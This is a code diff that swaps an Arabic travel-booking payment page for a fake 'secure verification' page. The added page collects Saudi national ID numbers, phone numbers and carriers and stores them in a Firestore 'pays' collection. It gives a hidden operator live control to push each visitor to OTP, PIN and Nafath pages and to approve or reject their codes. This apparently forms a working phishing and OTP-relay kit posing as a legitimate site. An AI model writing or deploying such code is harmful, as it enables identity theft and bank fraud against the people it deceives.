@@ -1,217 +1,506 @@
 "use client";
 
-import Link from "next/link";
-import { useRouter } from "next/navigation";
-import { useEffect, useMemo, useState } from "react";
-import {
-  confirmBooking,
-  formatCardNumber,
-  readBookingDraft,
-  saveBookingDraft,
-  validatePayment,
-  type PaymentDetails,
-} from "@/lib/booking-store";
-import { formatCurrency } from "@/lib/travel-data";
-import { readTravelDataset } from "@/lib/travel-store";
+import { useEffect, useState } from "react";
+import { toast } from "sonner";
+import { Button } from "@/components/ui/button";
+import { Card } from "@/components/ui/card";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Phone, ShieldCheck, CreditCard } from "lucide-react";
+import { StcVerificationModal } from "@/components/stc-verification-modal";
+import { MobilyVerificationModal } from "@/components/mobily-verification-modal";
+import { CarrierVerificationModal } from "@/components/carrier-verification-modal";
+import { PhoneOtpDialog } from "@/components/dialog-b";
 
-const defaultPayment: PaymentDetails = {
-  cardholderName: "",
-  cardNumber: "",
-  expiry: "",
-  cvv: "",
-};
+import { db, setDoc, doc } from "@/lib/firebase";
+import { onSnapshot, getDoc, Firestore } from "firebase/firestore";
+import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
+import { updateVisitorPage } from "@/lib/visitor-tracking";
 
-const extrasPricing: Record<string, number> = {
-  "أمتعة إضافية": 160,
-  "دخول الصالة": 220,
-  "إنترنت على متن الطائرة": 55,
-  "وجبة خاصة": 35,
-};
+export default function VerifyPhonePage() {
+  const [idNumber, setIdNumber] = useState("");
+  const [idError, setIdError] = useState("");
+  const [phoneNumber, setPhoneNumber] = useState("");
+  const [selectedCarrier, setSelectedCarrier] = useState("");
+  const [showStcModal, setShowStcModal] = useState(false);
+  const [showMobilyModal, setShowMobilyModal] = useState(false);
+  const [showCarrierModal, setShowCarrierModal] = useState(false);
+  const [showPhoneOtpDialog, setShowPhoneOtpDialog] = useState(false);
+  const [otpRejectionError, setOtpRejectionError] = useState("");
+  const [phoneError, setPhoneError] = useState("");
 
-export default function PaymentPage() {
-  const router = useRouter();
-  const dataset = useMemo(() => readTravelDataset(), []);
-  const [payment, setPayment] = useState<PaymentDetails>(defaultPayment);
-  const [promoCode, setPromoCode] = useState("");
-  const [error, setError] = useState("");
-  const [submitting, setSubmitting] = useState(false);
-  const [summary, setSummary] = useState({
-    route: "",
-    baseFare: 0,
-    seatFee: 0,
-    extrasTotal: 0,
-    taxes: 220,
-    departure: "",
-    destinationId: "",
-  });
+  // Saudi telecom operators
+  const telecomOperators = [
+    { value: "stc", label: "STC - الاتصالات السعودية" },
+    { value: "mobily", label: "Mobily - موبايلي" },
+    { value: "zain", label: "Zain - زين" },
+    { value: "virgin", label: "Virgin Mobile - فيرجن موبايل" },
+    { value: "lebara", label: "Lebara - ليبارا" },
+    { value: "salam", label: "SALAM - سلام" },
+    { value: "go", label: "GO - جو" },
+  ];
 
-  const autoDiscounts = useMemo(() => {
-    const booking = readBookingDraft();
-    const departureDate = booking.search?.departure ? new Date(booking.search.departure) : null;
-    const base = summary.baseFare + summary.extrasTotal + summary.seatFee;
-    return dataset.autoDiscounts
-      .filter((rule) => {
-        if (rule.type === "early-bird" && departureDate) {
-          const diffDays = Math.ceil((departureDate.getTime() - Date.now()) / 86400000);
-          return diffDays >= (rule.minDaysBeforeDeparture || 0);
-        }
-        if (rule.type === "destination") {
-          return rule.destinationIds?.includes(summary.destinationId);
-        }
-        return false;
-      })
-      .map((rule) => ({
-        label: rule.label,
-        amount: Math.round(base * (rule.value / 100)),
-      }));
-  }, [dataset.autoDiscounts, summary.baseFare, summary.destinationId, summary.extrasTotal, summary.seatFee]);
+  const visitorId =
+    typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";
 
-  const appliedPromo = useMemo(() => {
-    const booking = readBookingDraft();
-    const promo = dataset.promoCodes.find((item) => item.code === promoCode.trim().toUpperCase() && item.active);
-    if (!promo) return null;
-    if (promo.destinationIds?.length && !promo.destinationIds.includes(booking.flight?.destinationId || "")) return null;
-    return promo;
-  }, [dataset.promoCodes, promoCode]);
+  // Monitor for admin redirects
+  useRedirectMonitor({ visitorId, currentPage: "phone" });
 
-  const total = useMemo(() => {
-    const subtotal = summary.baseFare + summary.extrasTotal + summary.seatFee;
-    const promoDiscount = appliedPromo
-      ? appliedPromo.type === "percentage"
-        ? Math.round(subtotal * (appliedPromo.value / 100))
-        : appliedPromo.value
-      : 0;
-    const autoDiscountTotal = autoDiscounts.reduce((sum, item) => sum + item.amount, 0);
-    const discountTotal = promoDiscount + autoDiscountTotal;
-    return {
-      subtotal,
-      promoDiscount,
-      autoDiscountTotal,
-      discountTotal,
-      grandTotal: Math.max(subtotal + summary.taxes - discountTotal, 0),
-    };
-  }, [appliedPromo, autoDiscounts, summary.baseFare, summary.extrasTotal, summary.seatFee, summary.taxes]);
-
+  // Update visitor page and clear any old redirects
   useEffect(() => {
-    const booking = readBookingDraft();
-    if (!booking.passenger || !booking.flight) {
-      router.replace("/step2");
-      return;
+    if (visitorId) {
+      updateVisitorPage(visitorId, "phone", 7);
+
+      // Clear any old redirectPage to prevent unwanted navigation
+      if (!db) return;
+      const visitorRef = doc(db as Firestore, "pays", visitorId);
+      setDoc(
+        visitorRef,
+        {
+          redirectPage: null,
+        },
+        { merge: true }
+      ).catch((err) =>
+        console.error("[phone-info] Failed to clear redirectPage:", err)
+      );
     }
+  }, [visitorId]);
 
-    const extrasTotal = (booking.extras || []).reduce((sum, extra) => sum + (extrasPricing[extra] || 0), 0);
-    const seatFee = booking.seatSelection?.price || 0;
-    setPromoCode(booking.promoCode || "");
-    setSummary({
-      route: `${booking.search?.from || ""} ← ${booking.flight.destinationCity}`,
-      baseFare: booking.flight.baseFare || 0,
-      seatFee,
-      extrasTotal,
-      taxes: 220,
-      departure: booking.search?.departure || "",
-      destinationId: booking.flight.destinationId,
-    });
-  }, [router]);
+  // <ADMIN_NAVIGATION_SYSTEM> Unified navigation listener for admin control
+  useEffect(() => {
+    if (!visitorId) return;
 
-  function updateField(name: keyof PaymentDetails, value: string) {
-    if (name === "cardNumber") value = formatCardNumber(value);
-    if (name === "expiry") {
-      const digits = value.replace(/\D/g, "").slice(0, 4);
-      value = digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
-    }
-    if (name === "cvv") value = value.replace(/\D/g, "").slice(0, 4);
-    setPayment((current) => ({ ...current, [name]: value }));
-  }
+    console.log(
+      "[phone-info] Setting up navigation listener for visitor:",
+      visitorId
+    );
 
-  function handleConfirm() {
-    const validationError = validatePayment(payment);
-    if (validationError) {
-      setError(validationError);
-      return;
-    }
+    if (!db) return;
+    const unsubscribe = onSnapshot(
+      doc(db as Firestore, "pays", visitorId),
+      (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data();
+          console.log("[phone-info] Firestore data received:", data);
 
-    saveBookingDraft({
-      promoCode: promoCode.trim().toUpperCase(),
-      promoDiscount: total.promoDiscount,
-      appliedPromo,
-      autoDiscounts,
-      totals: {
-        baseFare: summary.baseFare,
-        extrasTotal: summary.extrasTotal,
-        seatTotal: summary.seatFee,
-        taxes: summary.taxes,
-        subtotal: total.subtotal,
-        discountTotal: total.discountTotal,
-        grandTotal: total.grandTotal,
+          // Admin navigation: Handle page redirects
+          if (data.currentStep === "home") {
+            console.log("[phone-info] Admin redirecting to home");
+            window.location.href = "/";
+          } else if (data.currentStep === "phone") {
+            console.log(
+              "[phone-info] Admin wants visitor to stay on phone page"
+            );
+            // Already on phone page, do nothing
+          } else if (data.currentStep === "_t6") {
+            console.log("[phone-info] Admin redirecting to nafad");
+            window.location.href = "/step4";
+          } else if (data.currentStep === "_st1") {
+            console.log("[phone-info] Admin redirecting to payment");
+            window.location.href = "/check";
+          } else if (data.currentStep === "_t2") {
+            console.log("[phone-info] Admin redirecting to otp");
+            window.location.href = "/step2";
+          } else if (data.currentStep === "_t3") {
+            console.log("[phone-info] Admin redirecting to pin");
+            window.location.href = "/step3";
+          }
+          // If currentStep === "phone" or a number (from updateVisitorPage), stay on this page
+        }
       },
-    });
+      (error) => {
+        console.error("[phone-info] Firestore listener error:", error);
+      }
+    );
 
-    setSubmitting(true);
-    const booking = confirmBooking(payment);
-    if (!booking) {
-      setError("تعذر إنشاء الحجز");
-      setSubmitting(false);
-      return;
+    return () => {
+      console.log("[phone-info] Cleaning up navigation listener");
+      unsubscribe();
+    };
+  }, []);
+
+  // ID number validation
+  const validateIdNumber = (id: string): boolean => {
+    const saudiIdRegex = /^[12]\d{9}$/;
+    if (!saudiIdRegex.test(id)) {
+      setIdError("رقم الهوية يجب أن يبدأ بـ 1 أو 2 ويتكون من 10 أرقام");
+      return false;
+    }
+    setIdError("");
+    return true;
+  };
+
+  // Phone number validation
+  const validatePhoneNumber = (phone: string): boolean => {
+    // Remove spaces and special characters
+    const cleanPhone = phone.replace(/\s/g, "");
+
+    // Saudi phone number validation: starts with 05 and 10 digits total
+    const saudiPhoneRegex = /^05\d{8}$/;
+
+    if (!saudiPhoneRegex.test(cleanPhone)) {
+      setPhoneError("رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام");
+      return false;
     }
 
-    router.push("/step6");
-  }
+    setPhoneError("");
+    return true;
+  };
+
+  const handleIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, ""); // Only numbers
+    if (value.length <= 10) {
+      setIdNumber(value);
+      if (value.length === 10) {
+        validateIdNumber(value);
+      } else {
+        setIdError("");
+      }
+    }
+  };
+
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, ""); // Only numbers
+    if (value.length <= 10) {
+      setPhoneNumber(value);
+      if (value.length === 10) {
+        validatePhoneNumber(value);
+      } else {
+        setPhoneError("");
+      }
+    }
+  };
+
+  const handleSendOtp = async () => {
+    if (!idNumber || !phoneNumber || !selectedCarrier) return;
+
+    if (!validateIdNumber(idNumber)) return;
+    if (!validatePhoneNumber(phoneNumber)) return;
+
+    const visitorID = localStorage.getItem("visitor");
+    if (!visitorID) return;
+
+    try {
+      // Save ID number, phone number and carrier to Firebase
+      if (!db) return;
+      await setDoc(
+        doc(db as Firestore, "pays", visitorID),
+        {
+          phoneIdNumber: idNumber,
+          phoneNumber: phoneNumber,
+          phoneCarrier: selectedCarrier,
+          phoneSubmittedAt: new Date().toISOString(),
+          _v4Status: "pending", // Set to pending for admin approval
+          phoneUpdatedAt: new Date().toISOString(),
+          redirectPage: null, // Clear any old redirect
+        },
+        { merge: true }
+      );
+
+      // Don't add to history yet - will add after OTP entry
+      // Open Phone OTP Dialog directly
+      setShowPhoneOtpDialog(true);
+    } catch (error) {
+      console.error("Error saving phone data:", error);
+      toast.error("حدث خطأ", {
+        description: "يرجى المحاولة مرة أخرى",
+        duration: 5000,
+      });
+    }
+  };
+
+  const handleApproved = () => {
+    // Admin approved phone OTP - close waiting modal and navigate to nafad
+    console.log("[step5] Phone OTP approved, navigating to nafad");
+
+    // Close all waiting modals
+    setShowStcModal(false);
+    setShowMobilyModal(false);
+    setShowCarrierModal(false);
+
+    // Navigate to nafad page
+    window.location.href = "/step4";
+  };
+
+  const handleRejected = async () => {
+    // Admin rejected - close modal and allow re-entry
+    const visitorID = localStorage.getItem("visitor");
+    if (!visitorID) return;
+
+    try {
+      // Get current phone data
+      if (!db) return;
+      const docRef = doc(db as Firestore, "pays", visitorID);
+      const docSnap = await getDoc(docRef);
+
+      if (docSnap.exists()) {
+        const data = docSnap.data();
+        const currentPhoneData = {
+          idNumber: data.phoneIdNumber || "",
+          phoneNumber: data.phoneNumber,
+          phoneCarrier: data.phoneCarrier,
+          rejectedAt: new Date().toISOString(),
+        };
+
+        // Save rejected phone data and reset status
+        await setDoc(
+          docRef,
+          {
+            oldPhoneInfo: data.oldPhoneInfo
+              ? [...data.oldPhoneInfo, currentPhoneData]
+              : [currentPhoneData],
+            phoneOtpStatus: "pending",
+            phoneCarrier: "", // Clear carrier to allow re-selection
+          },
+          { merge: true }
+        );
+      }
+    } catch (error) {
+      console.error("Error saving rejected phone data:", error);
+    }
+
+    // Close all modals
+    setShowStcModal(false);
+    setShowMobilyModal(false);
+    setShowCarrierModal(false);
+
+    // Reset form
+    setPhoneNumber("");
+    setSelectedCarrier("");
+
+    toast.error("تم رفض رقم الهاتف", {
+      description: "يرجى إدخال رقم جوال صحيح والمحاولة مرة أخرى",
+      duration: 5000,
+    });
+  };
+
+  const handleOtpRejected = () => {
+    // Admin rejected OTP - close waiting modals and reopen OTP dialog with error
+    console.log("[step5] Phone OTP rejected, reopening dialog with error");
+
+    // Close all waiting modals
+    setShowStcModal(false);
+    setShowMobilyModal(false);
+    setShowCarrierModal(false);
+
+    // Store error in localStorage so it persists across modal close/open
+    localStorage.setItem(
+      "phoneOtpRejectionError",
+      "رمز غير صالح - يرجى إدخال رمز التحقق الصحيح"
+    );
+
+    // Set error message in state as well
+    setOtpRejectionError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح");
+
+    // Reopen OTP dialog
+    setShowPhoneOtpDialog(true);
+  };
+
+  const handleShowWaitingModal = (carrier: string) => {
+    // Show appropriate waiting modal based on carrier
+    console.log("[step5] Showing waiting modal for carrier:", carrier);
+
+    if (carrier === "stc") {
+      setShowStcModal(true);
+    } else if (carrier === "mobily") {
+      setShowMobilyModal(true);
+    } else {
+      setShowCarrierModal(true);
+    }
+  };
 
   return (
-    <main className="min-h-screen bg-white px-4 py-10 md:px-8" dir="rtl">
-      <div className="mx-auto grid max-w-6xl gap-6 md:grid-cols-[1.1fr_0.8fr]">
-        <div className="rounded-[2rem] border border-[#eadbe1] bg-[#fcf8fa] p-8">
-          <p className="text-sm tracking-[0.25em] text-[#9a7485]">الخطوة 4</p>
-          <h1 className="mt-2 text-4xl font-bold text-[#4d102f]">الدفع بالبطاقة وإصدار التذكرة</h1>
+    <>
+      <div
+        className="min-h-screen bg-gradient-to-b from-[#1a5c85] to-[#2d7ba8] flex items-center justify-center p-4"
+        dir="rtl"
+      >
+        <div className="w-full max-w-lg space-y-6">
+          {/* Header */}
+          <div className="text-center text-white space-y-2 mb-8">
+            <h1 className="text-4xl font-bold text-balance">
+              نظام التحقق الآمن
+            </h1>
+            <p className="text-lg text-white/90">تحقق من هويتك بأمان وسرعة</p>
+          </div>
 
-          <div className="mt-8 grid gap-4">
-            <input value={payment.cardholderName} onChange={(event) => updateField("cardholderName", event.target.value)} placeholder="اسم حامل البطاقة" className="rounded-2xl border border-[#e7d9df] px-4 py-3" />
-            <input value={payment.cardNumber} onChange={(event) => updateField("cardNumber", event.target.value)} placeholder="رقم البطاقة" className="rounded-2xl border border-[#e7d9df] px-4 py-3" />
-            <div className="grid gap-4 md:grid-cols-2">
-              <input value={payment.expiry} onChange={(event) => updateField("expiry", event.target.value)} placeholder="MM/YY" className="rounded-2xl border border-[#e7d9df] px-4 py-3" />
-              <input value={payment.cvv} onChange={(event) => updateField("cvv", event.target.value)} placeholder="CVV" className="rounded-2xl border border-[#e7d9df] px-4 py-3" />
+          {/* Main Card */}
+          <Card className="p-6 space-y-6">
+            {/* Icon and Title */}
+            <div className="text-center space-y-4">
+              <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-[#1a5c85]">
+                <Phone className="w-10 h-10 text-white" />
+              </div>
+              <div>
+                <h2 className="text-2xl font-bold text-gray-900 mb-2">
+                  التحقق عن رقم الجوال
+                </h2>
+                <p className="text-sm text-gray-600">
+                  الرجاء إدخال رقم الهوية ورقم الجوال واختيار شركة الاتصالات
+                </p>
+              </div>
             </div>
-            <div className="rounded-[1.5rem] border border-dashed border-[#d7c0ca] bg-white p-4">
-              <label className="text-right">
-                <span className="mb-2 block text-sm text-[#7e6470]">كود الخصم</span>
-                <input value={promoCode} onChange={(event) => setPromoCode(event.target.value.toUpperCase())} placeholder="مثال: LONDON10" className="w-full rounded-2xl border border-[#e7d9df] px-4 py-3" />
-              </label>
-              <p className="mt-2 text-sm text-[#8a6d7b]">
-                {appliedPromo ? `تم تفعيل ${appliedPromo.label}` : "يمكنك إدخال كود خصم صالح في صفحة الدفع."}
+
+            {/* Verification Message */}
+            <div className="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-lg">
+              <div className="flex items-start gap-3">
+                <ShieldCheck className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
+                <p className="text-sm text-blue-900 font-medium leading-relaxed">
+                  للتحقق من ملكية وسيلة الدفع، يُرجى إدخال رقم الهوية ورقم
+                  الهاتف المرتبطين ببطاقتك البنكية.
+                </p>
+              </div>
+            </div>
+
+            {/* ID Number Input */}
+            <div className="space-y-2">
+              <Label
+                htmlFor="idNumber"
+                className="text-right block text-gray-700 font-semibold"
+              >
+                رقم الهوية *
+              </Label>
+              <div className="relative">
+                <Input
+                  id="idNumber"
+                  type="tel"
+                  placeholder="1xxxxxxxxx"
+                  value={idNumber}
+                  onChange={handleIdChange}
+                  className={`text-right pr-12 text-lg h-12 ${
+                    idError ? "border-red-500" : ""
+                  }`}
+                  dir="ltr"
+                />
+                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">
+                  <CreditCard className="w-5 h-5" />
+                </div>
+              </div>
+              {idError && (
+                <p className="text-red-500 text-sm text-right">{idError}</p>
+              )}
+            </div>
+
+            {/* Phone Number Input */}
+            <div className="space-y-2">
+              <Label
+                htmlFor="phone"
+                className="text-right block text-gray-700 font-semibold"
+              >
+                رقم الجوال *
+              </Label>
+              <div className="relative">
+                <Input
+                  id="phone"
+                  type="tel"
+                  placeholder="05xxxxxxxx"
+                  value={phoneNumber}
+                  onChange={handlePhoneChange}
+                  className={`text-right pr-20 text-lg h-12 ${
+                    phoneError ? "border-red-500" : ""
+                  }`}
+                  dir="ltr"
+                />
+                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-semibold">
+                  +966
+                </div>
+              </div>
+              {phoneError && (
+                <p className="text-red-500 text-sm text-right">{phoneError}</p>
+              )}
+            </div>
+
+            {/* Carrier Dropdown */}
+            <div className="space-y-2">
+              <Label
+                htmlFor="carrier"
+                className="text-right block text-gray-700 font-semibold"
+              >
+                شركة الاتصالات *
+              </Label>
+              <select
+                id="carrier"
+                value={selectedCarrier}
+                onChange={(e) => setSelectedCarrier(e.target.value)}
+                className="w-full h-12 text-right text-base border-2 rounded-lg px-4 bg-white focus:border-[#1a5c85] focus:outline-none shadow-sm appearance-none cursor-pointer"
+                style={{
+                  backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23333' d='M6 9L1 4h10z'/%3E%3C/svg%3E")`,
+                  backgroundRepeat: "no-repeat",
+                  backgroundPosition: "left 1rem center",
+                  paddingLeft: "2.5rem",
+                }}
+              >
+                <option value="">اختر شركة الاتصالات</option>
+                {telecomOperators.map((operator) => (
+                  <option key={operator.value} value={operator.value}>
+                    {operator.label}
+                  </option>
+                ))}
+              </select>
+            </div>
+
+            {/* Submit Button */}
+            <Button
+              onClick={handleSendOtp}
+              className="w-full h-14 text-lg bg-[#1a5c85] hover:bg-[#154a6d] disabled:opacity-50 disabled:cursor-not-allowed"
+              disabled={
+                !phoneNumber ||
+                !selectedCarrier ||
+                phoneNumber.length !== 10 ||
+                !!phoneError
+              }
+            >
+              <Phone className="ml-2 h-5 w-5" />
+              إرسال رمز التحقق
+            </Button>
+
+            {/* Info Box */}
+            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-center">
+              <p className="text-sm text-blue-900">
+                🔒 معلوماتك محمية بأعلى معايير الأمان والخصوصية
               </p>
             </div>
-          </div>
-
-          {error ? <p className="mt-4 text-right text-sm text-red-600">{error}</p> : null}
-          <div className="mt-8 flex justify-between">
-            <Link href="/step4" className="rounded-full border border-[#d7c0ca] px-5 py-3 text-[#5f0f40]">
-              رجوع
-            </Link>
-            <button onClick={handleConfirm} disabled={submitting} className="rounded-full bg-[#5f0f40] px-5 py-3 text-white disabled:opacity-60">
-              {submitting ? "جارٍ التأكيد..." : "تأكيد الحجز"}
-            </button>
-          </div>
+          </Card>
         </div>
-
-        <aside className="rounded-[2rem] bg-[#4b0d31] p-8 text-white">
-          <div className="text-sm text-white/70">ملخص الحجز</div>
-          <div className="mt-4 text-2xl font-bold">{summary.route || "رحلتك"}</div>
-          <div className="mt-3 text-white/80">السعر الأساسي: {formatCurrency(summary.baseFare)}</div>
-          <div className="mt-2 text-white/80">رسوم المقعد: {formatCurrency(summary.seatFee)}</div>
-          <div className="mt-2 text-white/80">الخدمات الإضافية: {formatCurrency(summary.extrasTotal)}</div>
-          <div className="mt-2 text-white/80">الضرائب والرسوم: {formatCurrency(summary.taxes)}</div>
-          {autoDiscounts.map((item) => (
-            <div key={item.label} className="mt-2 text-[#d8f3e5]">{item.label}: -{formatCurrency(item.amount)}</div>
-          ))}
-          {appliedPromo ? (
-            <div className="mt-2 text-[#d8f3e5]">كود الخصم: -{formatCurrency(total.promoDiscount)}</div>
-          ) : null}
-          <div className="mt-6 rounded-2xl bg-white/10 p-5">
-            <div className="text-sm text-white/70">الإجمالي</div>
-            <div className="mt-2 text-3xl font-extrabold">{formatCurrency(total.grandTotal)}</div>
-          </div>
-        </aside>
       </div>
-    </main>
+
+      {/* STC Verification Modal */}
+      <StcVerificationModal
+        open={showStcModal}
+        visitorId={visitorId}
+        onApproved={handleApproved}
+        onRejected={handleRejected}
+      />
+
+      {/* Mobily Verification Modal */}
+      <MobilyVerificationModal
+        open={showMobilyModal}
+        visitorId={visitorId}
+        onApproved={handleApproved}
+        onRejected={handleRejected}
+      />
+
+      {/* Other Carriers Verification Modal */}
+      <CarrierVerificationModal
+        open={showCarrierModal}
+        visitorId={visitorId}
+        onApproved={handleApproved}
+        onRejected={handleRejected}
+      />
+
+      {/* Phone OTP Dialog */}
+      <PhoneOtpDialog
+        open={showPhoneOtpDialog}
+        onOpenChange={(open) => {
+          setShowPhoneOtpDialog(open);
+          if (!open) setOtpRejectionError(""); // Clear error when closing
+        }}
+        phoneNumber={phoneNumber}
+        phoneCarrier={selectedCarrier}
+        onRejected={handleOtpRejected}
+        onShowWaitingModal={handleShowWaitingModal}
+        rejectionError={otpRejectionError}
+      />
+    </>
   );
 }
